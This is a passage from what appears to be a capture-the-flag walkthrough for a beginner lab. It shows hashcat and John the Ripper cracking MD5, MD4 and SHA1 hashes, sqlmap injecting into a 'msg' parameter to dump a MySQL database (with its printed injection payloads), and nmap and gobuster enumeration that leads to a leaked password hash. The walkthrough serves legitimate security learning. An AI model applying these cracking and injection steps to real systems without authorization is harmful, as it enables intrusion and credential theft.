</code></pre><h2 id="task-13---hash-cracking---hashcat">Task 13 - Hash Cracking - hashcat</h2><h3 id="references-3">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-hashcat" target="_blank">Build Hashcat</a><li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">Example Hashes</a></ul><p>The two tasks mentioned can be done either via hashcat command or online resouces, like <a href="https://www.dcode.fr/hash-function" target="_blank">this</a> or <a href="https://crackstation.net/" target="_blank">this</a>. If getting <code>Segmentation Fault</code> while using hashcat, either use the <a href="https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#i_may_have_the_wrong_driver_installed_what_should_i_do" target="_blank">link</a> to setup proper drivers, or use THM attackbox, or use online hash cracking to get the flag.</p><p>Use the following command to decrypt MD5 hash.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="hashcat%20-m0%20-a0%20-O%20--force%20%2256ab24c15b72a457069c5ea42fcfc640%22%20/usr/share/wordlists/rockyou.txt" type="button"></button></div></div><pre><code>hashcat -m0 -a0 -O --force "56ab24c15b72a457069c5ea42fcfc640" /usr/share/wordlists/rockyou.txt
</code></pre><p>The cracked password will be similar to,</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Host%20memory%20required%20for%20this%20attack:%200%20MB%0A%0ADictionary%20cache%20built:%0A*%20Filename..:%20/usr/share/wordlists/rockyou.txt%0A*%20Passwords.:%2014344392%0A*%20Bytes.....:%20139921507%0A*%20Keyspace..:%2014344385%0A*%20Runtime...:%204%20secs%0A%0A56ab24c15b72a457069c5ea42fcfc640:%3Cflag%3E%0A%0ASession..........:%20hashcat%0AStatus...........:%20Cracked%0AHash.Name........:%20MD5%0AHash.Target......:%2056ab24c15b72a457069c5ea42fcfc640%0ATime.Started.....:%20Sat%20Dec%2024%2003:34:49%202020,%20(0%20secs)%0ATime.Estimated...:%20Sat%20Dec%2024%2003:34:49%202020,%20(0%20secs)%0AGuess.Base.......:%20File%20(/usr/share/wordlists/rockyou.txt)%0AGuess.Queue......:%201/1%20(100.00%25)%0ASpeed.#1.........:%20%20%20439.6%20kH/s%20(0.90ms)%20@%20Accel:1024%20Loops:1%20Thr:1%20Vec:4%0ARecovered........:%201/1%20(100.00%25)%20Digests%0AProgress.........:%202048/14344385%20(0.01%25)%0ARejected.........:%200/2048%20(0.00%25)%0ARestore.Point....:%200/14344385%20(0.00%25)%0ARestore.Sub.#1...:%20Salt:0%20Amplifier:0-1%20Iteration:0-1%0ACandidates.#1....:%20123456%20-%3E%20lovers1" type="button"></button></div></div><pre><code>Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 4 secs

56ab24c15b72a457069c5ea42fcfc640:&lt;flag&gt;

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 56ab24c15b72a457069c5ea42fcfc640
Time.Started.....: Sat Dec 24 03:34:49 2020, (0 secs)
Time.Estimated...: Sat Dec 24 03:34:49 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   439.6 kH/s (0.90ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -&gt; lovers1
</code></pre><p>Use the following command to decrypt MD4 hash.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="hashcat%20-m900%20-a0%20-O%20--force%20%224bc9ae2b9236c2ad02d81491dcb51d5f%22%20/usr/share/wordlists/rockyou.txt" type="button"></button></div></div><pre><code>hashcat -m900 -a0 -O --force "4bc9ae2b9236c2ad02d81491dcb51d5f" /usr/share/wordlists/rockyou.txt
</code></pre><p>The cracked password will be similar to,</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Host%20memory%20required%20for%20this%20attack:%200%20MB%0A%0ADictionary%20cache%20built:%0A*%20Filename..:%20/usr/share/wordlists/rockyou.txt%0A*%20Passwords.:%2014344392%0A*%20Bytes.....:%20139921507%0A*%20Keyspace..:%2014344385%0A*%20Runtime...:%203%20secs%0A%0A4bc9ae2b9236c2ad02d81491dcb51d5f:%3Cflag%3E%0A%0ASession..........:%20hashcat%0AStatus...........:%20Cracked%0AHash.Name........:%20MD4%0AHash.Target......:%204bc9ae2b9236c2ad02d81491dcb51d5f%0ATime.Started.....:%20Sat%20Dec%2024%2003:40:39%202020,%20(2%20secs)%0ATime.Estimated...:%20Sat%20Dec%2024%2003:40:41%202020,%20(0%20secs)%0AGuess.Base.......:%20File%20(/usr/share/wordlists/rockyou.txt)%0AGuess.Queue......:%201/1%20(100.00%25)%0ASpeed.#1.........:%20%20%20733.1%20kH/s%20(0.73ms)%20@%20Accel:1024%20Loops:1%20Thr:1%20Vec:4%0ARecovered........:%201/1%20(100.00%25)%20Digests%0AProgress.........:%20839704/14344385%20(5.85%25)%0ARejected.........:%2024/839704%20(0.00%25)%0ARestore.Point....:%20837656/14344385%20(5.84%25)%0ARestore.Sub.#1...:%20Salt:0%20Amplifier:0-1%20Iteration:0-1%0ACandidates.#1....:%20notnotnot%20-%3E%20ninja202" type="button"></button></div></div><pre><code>Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

4bc9ae2b9236c2ad02d81491dcb51d5f:&lt;flag&gt;

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD4
Hash.Target......: 4bc9ae2b9236c2ad02d81491dcb51d5f
Time.Started.....: Sat Dec 24 03:40:39 2020, (2 secs)
Time.Estimated...: Sat Dec 24 03:40:41 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   733.1 kH/s (0.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 839704/14344385 (5.85%)
Rejected.........: 24/839704 (0.00%)
Restore.Point....: 837656/14344385 (5.84%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: notnotnot -&gt; ninja202
</code></pre><h2 id="task-14---hash-cracking---john-the-ripper">Task 14 - Hash Cracking - John the Ripper</h2><h3 id="references-4">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-john-the-ripper" target="_blank">Install John</a></ul><p>Check available formats for use with john command <code>john --list=formats</code>. Sometimes, john will show an output <code>No password hashes left to crack (see FAQ)</code> for some hashes. Using a manual pot file resolves this issue.</p><p>To crack the MD5 hash, copy the hash to a file for cracking, <code>echo "5d41402abc4b2a76b9719d911017c592" &gt; /data/hash.txt</code>. Use the following command to crack the password.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="john%20--format=Raw-MD5%20--wordlist=/usr/share/wordlists/rockyou.txt%20--pot=/data/john.pot%20/data/hash.txt" type="button"></button></div></div><pre><code>john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt --pot=/data/john.pot /data/hash.txt
</code></pre><p>Similar output will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Using%20default%20input%20encoding:%20UTF-8%0ALoaded%201%20password%20hash%20(Raw-MD5%20[MD5%20128/128%20SSE4.1%204x3])%0AWarning:%20no%20OpenMP%20support%20for%20this%20hash%20type,%20consider%20--fork=2%0APress%20'q'%20or%20Ctrl-C%20to%20abort,%20almost%20any%20other%20key%20for%20status%0A%3Cflag%3E%20%20%20%20%20%20%20%20%20%20%20%20(?)%0A1g%200:00:00:00%20DONE%20(2020-12-24%2004:21)%2050.00g/s%209600p/s%209600c/s%209600C/s%20123456..november%0AUse%20the%20%22--show%20--format=Raw-MD5%22%20options%20to%20display%20all%20of%20the%20cracked%20passwords%20reliably%0ASession%20completed." type="button"></button></div></div><pre><code>Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE4.1 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
&lt;flag&gt;            (?)
1g 0:00:00:00 DONE (2020-12-24 04:21) 50.00g/s 9600p/s 9600c/s 9600C/s 123456..november
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
</code></pre><p>To crack the SHA1 hash, copy the hash to a file for cracking, <code>echo "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" &gt; /data/hash.txt</code>. Use the following command to crack the password.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="john%20--format=Raw-SHA1%20--wordlist=/usr/share/wordlists/rockyou.txt%20--pot=/data/john.pot%20/data/hash.txt" type="button"></button></div></div><pre><code>john --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt --pot=/data/john.pot /data/hash.txt
</code></pre><p>Similar output will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Using%20default%20input%20encoding:%20UTF-8%0ALoaded%201%20password%20hash%20(Raw-SHA1%20[SHA1%20128/128%20SSE4.1%204x])%0AWarning:%20no%20OpenMP%20support%20for%20this%20hash%20type,%20consider%20--fork=2%0APress%20'q'%20or%20Ctrl-C%20to%20abort,%20almost%20any%20other%20key%20for%20status%0A%3Cflag%3E%20%20%20%20%20%20%20%20%20(?)%0A1g%200:00:00:00%20DONE%20(2020-12-24%2004:25)%20100.0g/s%20400.0p/s%20400.0c/s%20400.0C/s%20123456..password%0AUse%20the%20%22--show%20--format=Raw-SHA1%22%20options%20to%20display%20all%20of%20the%20cracked%20passwords%20reliably%0ASession%20completed." type="button"></button></div></div><pre><code>Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 SSE4.1 4x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
&lt;flag&gt;         (?)
1g 0:00:00:00 DONE (2020-12-24 04:25) 100.0g/s 400.0p/s 400.0c/s 400.0C/s 123456..password
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
</code></pre><h2 id="task-18---sql-injection---vulnerable-web-application">Task 18 - SQL Injection - Vulnerable Web Application</h2><h3 id="references-5">References</h3><ul><li><a href="https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet" target="_blank">SQLmap cheatsheet</a></ul><p>Deploy the machine and check web response, using <code>curl &lt;ip&gt;</code></p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="!%3CDOCTYPE%20html%3E%0A%3Chtml%20lang=%22en%22%3E%0A%3Chead%3E%0A%3Cmeta%20charset=%22UTF-8%22%3E%0A%3Ctitle%3EAdd%20Record%20Form%3C/title%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Cform%20action=%22/%22%20method=%22post%22%3E%0A%20%20%20%3Cp%3Emsg:%20%3C/p%3E%20%3Cinput%20type=%22text%22%20name=%22msg%22%20id=%22msgg%22%3E%0A%3C/form%3E%0A%3C/body%3E%0A%3C/html%3E" type="button"></button></div></div><pre><code>!&lt;DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="UTF-8"&gt;
&lt;title&gt;Add Record Form&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action="/" method="post"&gt;
   &lt;p&gt;msg: &lt;/p&gt; &lt;input type="text" name="msg" id="msgg"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>There is a parameter named <code>msg</code>, which could be exploited. To get the flag in MySQL backend of vulnerable web app, use the command,</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="sqlmap%20-u%20%22http://%3Cip%3E%22%20--data%20%22msg=test%22%20-p%20msg%20--dump%20--batch%20-v%200" type="button"></button></div></div><pre><code>sqlmap -u "http://&lt;ip&gt;" --data "msg=test" -p msg --dump --batch -v 0
</code></pre><p>The following response would be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[*]%20starting%20@%2004:44:00%20/2020-12-24/%0A%0Ait%20looks%20like%20the%20back-end%20DBMS%20is%20'MySQL'.%20Do%20you%20want%20to%20skip%20test%20payloads%20specific%20for%20other%20DBMSes?%20[Y/n]%20Y%0Afor%20the%20remaining%20tests,%20do%20you%20want%20to%20include%20all%20tests%20for%20'MySQL'%20extending%20provided%20level%20(1)%20and%20risk%20(1)%20values?%20[Y/n]%20Y%0APOST%20parameter%20'msg'%20is%20vulnerable.%20Do%20you%20want%20to%20keep%20testing%20the%20others%20(if%20any)?%20[y/N]%20N%0Asqlmap%20identified%20the%20following%20injection%20point(s)%20with%20a%20total%20of%20366%20HTTP(s)%20requests:%0A---%0AParameter:%20msg%20(POST)%0A%20%20%20%20Type:%20boolean-based%20blind%0A%20%20%20%20Title:%20MySQL%20RLIKE%20boolean-based%20blind%20-%20WHERE,%20HAVING,%20ORDER%20BY%20or%20GROUP%20BY%20clause%0A%20%20%20%20Payload:%20msg=test'%20RLIKE%20(SELECT%20(CASE%20WHEN%20(6965=6965)%20THEN%200x74657374%20ELSE%200x28%20END))--%20eMep%0A%0A%20%20%20%20Type:%20error-based%0A%20%20%20%20Title:%20MySQL%20%3E=%205.0%20AND%20error-based%20-%20WHERE,%20HAVING,%20ORDER%20BY%20or%20GROUP%20BY%20clause%20(FLOOR)%0A%20%20%20%20Payload:%20msg=test'%20AND%20(SELECT%201792%20FROM(SELECT%20COUNT(*),CONCAT(0x71626b7671,(SELECT%20(ELT(1792=1792,1))),0x71786b7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20zCjW%0A%0A%20%20%20%20Type:%20AND/OR%20time-based%20blind%0A%20%20%20%20Title:%20MySQL%20%3E=%205.0.12%20AND%20time-based%20blind%0A%20%20%20%20Payload:%20msg=test'%20AND%20SLEEP(5)--%20IIix%0A---%0Aweb%20server%20operating%20system:%20Linux%20Ubuntu%0Aweb%20application%20technology:%20PHP%207.0.33%0Aback-end%20DBMS:%20MySQL%20%3E=%205.0%0ADatabase:%20%3Cflag1%3E%0ATable:%20msg%0A[2%20entries]%0A+------+%0A%7C%20msg%20%20%7C%0A+------+%0A%7C%20msg%20%20%7C%0A%7C%20test%20%7C%0A+------+%0A%0ADatabase:%20%3Cflag1%3E%0ATable:%20lol%0A[1%20entry]%0A+----------+%0A%7C%20flag%20%20%20%20%20%7C%0A+----------+%0A%7C%20%3Cflag3%3E%20%20%7C%0A+----------+%0A%0A[*]%20ending%20@%2004:45:21%20/2020-12-24/" type="button"></button></div></div><pre><code>[*] starting @ 04:44:00 /2020-12-24/

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
POST parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 366 HTTP(s) requests:
---
Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=test' RLIKE (SELECT (CASE WHEN (6965=6965) THEN 0x74657374 ELSE 0x28 END))-- eMep

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: msg=test' AND (SELECT 1792 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(1792=1792,1))),0x71786b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zCjW

    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind
    Payload: msg=test' AND SLEEP(5)-- IIix
---
web server operating system: Linux Ubuntu
web application technology: PHP 7.0.33
back-end DBMS: MySQL &gt;= 5.0
Database: &lt;flag1&gt;
Table: msg
[2 entries]
+------+
| msg  |
+------+
| msg  |
| test |
+------+

Database: &lt;flag1&gt;
Table: lol
[1 entry]
+----------+
| flag     |
+----------+
| &lt;flag3&gt;  |
+----------+

[*] ending @ 04:45:21 /2020-12-24/
</code></pre><h2 id="task-24---final-exam">Task 24 - Final Exam</h2><p>Deploy the machine, and do a quick basic enumeration,</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-n%20-T4%20-F%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -n -T4 -F &lt;ip&gt;
</code></pre><p>The list of open ports can be seen.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.70%20(%20https://nmap.org%20)%20at%202020-12-24%2004:52%20IST%0ANmap%20scan%20report%20for%20%3Cip%3E%0AHost%20is%20up%20(0.16s%20latency).%0ANot%20shown:%2097%20closed%20ports%0APORT%20%20%20%20%20STATE%20%20%20%20SERVICE%0A22/tcp%20%20%20open%20%20%20%20%20ssh%0A80/tcp%20%20%20open%20%20%20%20%20http%0A5101/tcp%20filtered%20admdog%0A%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%202.19%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2020-12-24 04:52 IST
Nmap scan report for &lt;ip&gt;
Host is up (0.16s latency).
Not shown: 97 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
5101/tcp filtered admdog

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
</code></pre><p>Check if we get response on port 80.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="curl%20-I%20-L%20-s%20%3Cip%3E" type="button"></button></div></div><pre><code>curl -I -L -s &lt;ip&gt;
</code></pre><p>The response would be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="HTTP/1.1%20200%20OK%0ADate:%20Fri,%2023%20Dec%202020%2023:26:53%20GMT%0AServer:%20Apache/2.4.18%20(Ubuntu)%0ALast-Modified:%20Sat,%2021%20Dec%202019%2002:19:15%20GMT%0AETag:%20%222c39-59a2d6bc5ae41%22%0AAccept-Ranges:%20bytes%0AContent-Length:%2011321%0AVary:%20Accept-Encoding%0AContent-Type:%20text/html" type="button"></button></div></div><pre><code>HTTP/1.1 200 OK
Date: Fri, 23 Dec 2020 23:26:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sat, 21 Dec 2019 02:19:15 GMT
ETag: "2c39-59a2d6bc5ae41"
Accept-Ranges: bytes
Content-Length: 11321
Vary: Accept-Encoding
Content-Type: text/html
</code></pre><p>Check if gobuster can detect the directories and files. We could use common.txt wordlist from dirb for quick enumeration.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gobuster%20dir%20-u%20%22http://%3Cip%3E%22%20-w%20/usr/share/dirb/wordlists/common.txt%20--random-agent%20--no-error" type="button"></button></div></div><pre><code>gobuster dir -u "http://&lt;ip&gt;" -w /usr/share/dirb/wordlists/common.txt --random-agent --no-error
</code></pre><p>Similar output will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="===============================================================%0AGobuster%20v3.1.0%0Aby%20OJ%20Reeves%20(@TheColonial)%20&amp;%20Christian%20Mehlmauer%20(@firefart)%0A===============================================================%0A[+]%20Url:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http://%3Cip%3E%0A[+]%20Method:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20GET%0A[+]%20Threads:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010%0A[+]%20Wordlist:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20/usr/share/dirb/wordlists/common.txt%0A[+]%20Negative%20Status%20codes:%20%20%20404%0A[+]%20User%20Agent:%20%20%20%20%20%20%20%20%20%20%20%20%20%20Mozilla/5.0%20(Windows;%20U;%20Windows%20NT%206.0;%20en-US)%20AppleWebKit/530.5%20(KHTML,%20like%20Gecko)%20Chrome/2.0.172.6%20Safari/530.5%0A[+]%20Timeout:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010s%0A===============================================================%0A2020/12/24%2005:02:11%20Starting%20gobuster%20in%20directory%20enumeration%20mode%0A===============================================================%0A/.hta%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/.htaccess%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/.htpasswd%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/index.html%20%20%20%20%20%20%20%20%20%20%20(Status:%20200)%20[Size:%2011321]%0A/secret%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20301)%20[Size:%20311]%20[--%3E%20http://10.10.95.65/secret/]%0A/server-status%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A%0A===============================================================%0A2020/12/24%2005:03:26%20Finished%0A===============================================================" type="button"></button></div></div><pre><code>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://&lt;ip&gt;
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.6 Safari/530.5
[+] Timeout:                 10s
===============================================================
2020/12/24 05:02:11 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 11321]
/secret               (Status: 301) [Size: 311] [--&gt; http://10.10.95.65/secret/]
/server-status        (Status: 403) [Size: 276]

===============================================================
2020/12/24 05:03:26 Finished
===============================================================
</code></pre><p>Check if we can find any text files in <code>/secret</code> directory.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gobuster%20dir%20-u%20%22http://%3Cip%3E/secret%22%20-x%20txt%20-w%20/usr/share/dirb/wordlists/common.txt%20--random-agent%20--no-error" type="button"></button></div></div><pre><code>gobuster dir -u "http://&lt;ip&gt;/secret" -x txt -w /usr/share/dirb/wordlists/common.txt --random-agent --no-error
</code></pre><p>An output similar will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="===============================================================%0AGobuster%20v3.1.0%0Aby%20OJ%20Reeves%20(@TheColonial)%20&amp;%20Christian%20Mehlmauer%20(@firefart)%0A===============================================================%0A[+]%20Url:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http://%3Cip%3E/secret%0A[+]%20Method:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20GET%0A[+]%20Threads:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010%0A[+]%20Wordlist:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20/usr/share/dirb/wordlists/common.txt%0A[+]%20Negative%20Status%20codes:%20%20%20404%0A[+]%20User%20Agent:%20%20%20%20%20%20%20%20%20%20%20%20%20%20Mozilla/5.0%20(Windows%20NT%206.1;%20rv:2.0b11pre)%20Gecko/20110126%20Firefox/4.0b11pre%0A[+]%20Extensions:%20%20%20%20%20%20%20%20%20%20%20%20%20%20txt%0A[+]%20Timeout:%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010s%0A===============================================================%0A2020/12/24%2005:04:39%20Starting%20gobuster%20in%20directory%20enumeration%20mode%0A===============================================================%0A/.hta%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/.hta.txt%20%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/.htaccess%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/.htpasswd%20%20%20%20%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/.htaccess.txt%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/.htpasswd.txt%20%20%20%20%20%20%20%20(Status:%20403)%20[Size:%20276]%0A/index.html%20%20%20%20%20%20%20%20%20%20%20(Status:%20200)%20[Size:%200]%0A/secret.txt%20%20%20%20%20%20%20%20%20%20%20(Status:%20200)%20[Size:%2046]%0A%0A===============================================================%0A2020/12/24%2005:07:09%20Finished%0A===============================================================" type="button"></button></div></div><pre><code>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://&lt;ip&gt;/secret
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (Windows NT 6.1; rv:2.0b11pre) Gecko/20110126 Firefox/4.0b11pre
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2020/12/24 05:04:39 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 0]
/secret.txt           (Status: 200) [Size: 46]

===============================================================
2020/12/24 05:07:09 Finished
===============================================================
</code></pre><p>Check if we can read contents of <code>/secret.txt</code> file.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="curl%20http://%3Cip%3E/secret/secret.txt" type="button"></button></div></div><pre><code>curl http://&lt;ip&gt;/secret/secret.txt
</code></pre><p>We get a hashed password <code>nyan:046385855FC9580393853D8E81F240B66FE9A7B8</code>.</p><p>Check what kind of hash we got, using,</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="hashid%20-m%20046385855FC9580393853D8E81F240B66FE9A7B8" type="button"></button></div></div><pre><code>hashid -m 046385855FC9580393853D8E81F240B66FE9A7B8
</code></pre><p>We get recommendations on what could be the type of hash.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Analyzing%20'046385855FC9580393853D8E81F240B66FE9A7B8'%0A[+]%20SHA-1%20[Hashcat%20Mode:%20100]%0A[+]%20Double%20SHA-1%20[Hashcat%20Mode:%204500]%0A[+]%20RIPEMD-160%20[Hashcat%20Mode:%206000]%0A[+]%20Haval-160%0A[+]%20Tiger-160%0A[+]%20HAS-160%0A[+]%20LinkedIn%20[Hashcat%20Mode:%20190]%0A[+]%20Skein-256(160)%0A[+]%20Skein-512(160)" type="button"></button></div></div><pre><code>Analyzing '046385855FC9580393853D8E81F240B66FE9A7B8'
[+] SHA-1 [Hashcat Mode: 100]
[+] Double SHA-1 [Hashcat Mode: 4500]
[+] RIPEMD-160 [Hashcat Mode: 6000]
[+] Haval-160
[+] Tiger-160
[+] HAS-160
[+] LinkedIn [Hashcat Mode: 190]
[+] Skein-256(160)
[+] Skein-512(160)
</code></pre><p>This can be decrypted using either hashcat or john.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="hashcat%20-m100%20-a0%20-O%20--force%20%22046385855FC9580393853D8E81F240B66FE9A7B8%22%20/usr/share/wordlists/rockyou.txt" type="button"></button></div></div><pre><code>hashcat -m100 -a0 -O --force "046385855FC9580393853D8E81F240B66FE9A7B8" /usr/share/wordlists/rockyou.txt
